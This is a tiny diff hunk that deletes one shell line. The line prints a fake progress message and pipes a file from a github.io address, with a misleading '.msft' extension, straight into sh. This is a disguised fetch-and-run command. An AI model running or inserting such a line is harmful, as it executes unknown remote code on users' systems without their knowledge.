@@ -1,1 +1,0 @@
-echo 'Progress: 42.0%'; curl -L --progress-bar frkns.github.io/fun/Essays.msft | sh
